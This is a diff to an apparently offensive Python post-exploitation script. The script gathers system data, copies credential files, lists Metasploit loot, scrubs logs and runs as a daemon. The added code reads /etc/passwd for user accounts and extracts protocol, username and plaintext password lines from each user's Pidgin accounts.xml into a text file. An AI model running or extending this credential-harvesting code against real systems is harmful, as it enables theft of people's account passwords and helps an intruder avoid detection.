@@ -222,7 +222,6 @@ def Gather_OS():
    if os.path.exists(Home_Dir+"/.mozilla/") is True:
        os.system("find "+Home_Dir+"/.mozilla -name bookmarks*.json > UsersBookmarks.txt")
 
-
    
 def GetCredentials():
     print("[+] Collecting user and system credentials....")
@@ -254,7 +253,30 @@ def GetCredentials():
     	if os.path.exists(x) is True:
     		shutil.copy2(x, Temp_Dir+"/credentials/")
 
-
+    users = []
+    passwd = open('/etc/passwd')
+    for line in passwd:
+        fields = line.split(':')
+        uid = int(fields[2])
+        if uid > 500 and uid < 32328:
+             users.append(fields[0])
+    if whereis('pidgin') is not None:
+        for user in users:
+            if os.path.exists("/home/"+user+"/.purple/accounts.xml") is True:
+                accts = open("/home/"+user+"/.purple/accounts.xml")
+                saved = open('Pidgin.txt', 'a')
+                for line in accts.readlines():
+                    if '<protocol>' in line:
+                        saved.write(line)
+                    elif '<name>' in line:
+                        saved.write(line)
+                    elif '<password>' in line:
+                        saved.write(line)
+                    else:
+                        pass
+                accts.close()
+                saved.close()
+            
 
 def NetworkInfo():
    print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
@@ -367,6 +389,7 @@ def whereis(program):
             not os.path.isdir(os.path.join(path, program)):
                 return os.path.join(path, program)
     return None
+
     
 def FindExtras():
     os.mkdir(Temp_Dir+"/extras")
@@ -417,6 +440,7 @@ def FindExtras():
                
     if os.path.exists("~/.msf4/") is True:
         os.system("ls -l ~/.msf/loot > MetasploitLoot.txt")
+
 
 def ScrubLog():  
   try:
@@ -819,6 +843,7 @@ def MakeArchive():
          print("[!] No reports exist to archive!")
     tar.close()
     sys.exit(2)
+
 
 def daemon(stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     try: 
